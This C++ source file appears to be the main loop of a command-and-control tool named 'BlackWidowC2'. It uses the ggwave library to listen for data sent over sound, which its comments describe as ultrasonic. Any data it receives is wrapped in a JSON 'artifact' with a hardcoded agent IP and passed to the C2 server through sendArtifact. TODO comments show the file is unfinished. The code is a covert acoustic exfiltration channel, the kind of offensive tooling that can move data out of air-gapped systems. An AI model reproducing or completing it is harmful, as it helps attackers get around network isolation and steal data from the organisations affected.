#include "BlackWidowC2.h"
#include "ggwave-common-sdl2.h"

#include <ggwave/ggwave.h>

#include <iostream>
#include <mutex>
#include <thread>

int main()
{
	int captureId = 0;
	int playbackId = 0;
	int txProtocol = 1;

	if (GGWave_init(playbackId, captureId) == false) {
		fprintf(stderr, "Failed to initialize GGWave\n");
		return -1;
	}

	auto ggWave = GGWave_instance();

	printf("Available Tx protocols:\n");
	const auto& protocols = GGWave::getTxProtocols();
	for (const auto& protocol : protocols) {
		printf("    -t%d : %s\n", protocol.first, protocol.second.name);
	}

	if (txProtocol < 0 || txProtocol >(int) ggWave->getTxProtocols().size()) {
		fprintf(stderr, "Unknown Tx protocol %d\n", txProtocol);
		return -3;
	}

	printf("Selecting Tx protocol %d\n", txProtocol);

	std::mutex mutex;

	while (true) {
		std::this_thread::sleep_for(std::chrono::milliseconds(1));
		{
			std::lock_guard<std::mutex> lock(mutex);
			GGWave_mainLoop();

			GGWave::TxRxData rxData;
			auto rxDataLength = ggWave->takeRxData(rxData);
			if (rxDataLength > 0)
			{
				// TODO: need to listen with ultrasonic lib, when something catched -> build send artifact to C2

				// If not exist agent - creates new one and saves artifact
				// If already exist - only saves artifact
				// TODO: need to find primary IP (currently hardcoded to "10.123.0.21")
				std::string data(rxData.begin(), rxData.end());
				data.resize(rxDataLength);
				const std::string artifact_start = "{\"agentIp\": \"10.123.0.21\",\"content\": \"{\\\"data\\\":\\\"";
				const std::string artifact = artifact_start + data + "\\\"}\"}";
				
				sendArtifact(artifact.c_str());
			}
		}
	}

	GGWave_deinit();
}
